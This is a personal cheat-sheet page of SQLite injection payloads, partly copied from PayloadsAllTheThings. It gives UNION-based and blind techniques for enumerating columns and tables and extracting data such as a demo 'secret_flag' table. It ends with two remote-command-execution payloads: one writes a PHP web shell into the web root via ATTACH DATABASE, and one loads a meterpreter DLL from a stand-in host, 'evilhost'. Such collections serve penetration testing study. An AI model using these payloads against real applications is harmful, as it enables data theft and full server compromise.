---
title: sqlite
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - database
  - relational
  - database
  - SQL
---

# SQLite injections


## Basic payloads

```
# Ensure that the targeted parameter is vulnerable
1' a' or '1'='1' --

# Determine the number of columns of the query
1' a' or '1'='1' order by 1 -- //returns all results
1' a' or '1'='1' order by 2 -- //returns all results
1' a' or '1'='1' order by 3 -- //returns all results
1' a' or '1'='1' order by 4 -- //returns all results
1' a' or '1'='1' order by 5 -- //returns all results
1' a' or '1'='1' order by 6 -- //returns none
# Therefore the query contains 5 columns.

# Determine which columns are being returned
1' a' or '1'='1' UNION SELECT 1,2,3,4,5 -- 
# The table in this demo returned values 1,3,4,5. Value 2 was not returned.

# Extract version of sqlite database
1' a' or '1'='1' UNION SELECT sqlite_version,NULL,NULL,NULL,NULL -- 

# Determine the name and schema of the tables stored in the database.
a' or '1'='1' union select tbl_name,2,3,4,5 from sqlite_master --

# Determine the SQL command used to construct the tables:
a' or '1'='1' union select sql,2,3,4,5 from sqlite_master --
# In this demo it returned:
1	CREATE TABLE results (rollno text primary key, email text, name text, marks real, rank integer)	4	5
1	CREATE TABLE secret_flag (flag text, value text)	4	5

# Retrieve two columns from a table
a' or '1'='1' union select flag,2,value,4,5 from secret_flag --
```



Source: [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)

```sql
# SQLite comments
--
/**/

# SQLite version
select sqlite_version();

# String based: Extract database structure
SELECT sql FROM sqlite_schema

# \Integer or String based: Extract table name
SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'

# \Integer or String based: Extract column name
SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'

# For a clean output
SELECT replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')%2b1)),instr((substr(sql,instr(sql,'(')%2b1)),'')),"TEXT",''),"INTEGER",''),"AUTOINCREMENT",''),"PRIMARY KEY",''),"UNIQUE",''),"NUMERIC",''),"REAL",''),"BLOB",''),"NOT NULL",''),",",'~~') FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='table_name'

# Cleaner output
SELECT GROUP_CONCAT(name) AS column_names FROM pragma_table_info('table_name');

# \Boolean: Count number of tables
and (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ) < number_of_table

# \Boolean: Enumerating table name

and (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' limit 1 offset 0)=table_name_length_number

# \Boolean:  Extract info
and (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) > hex('some_char')

# \Boolean: Extract info (order by)
CASE WHEN (SELECT hex(substr(sql,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) = hex('some_char') THEN <order_element_1> ELSE <order_element_2> END

# \Boolean: Error based
AND CASE WHEN [BOOLEAN_QUERY] THEN 1 ELSE load_extension(1) END

# \Time based
AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
```


## Remote Command Execution using SQLite command - Attach Database

```sql
ATTACH DATABASE '/var/www/lol.php' AS lol;
CREATE TABLE lol.pwn (dataz text);
INSERT INTO lol.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>");--
```

## Remote Command Execution using SQLite command - Load_extension

```sql
UNION SELECT 1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--
```


## References

[Injecting SQLite database based application - Manish Kishan Tanwar](https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf)
[SQLite Error Based Injection for Enumeration](https://rioasmara.com/2021/02/06/sqlite-error-based-injection-for-enumeration/)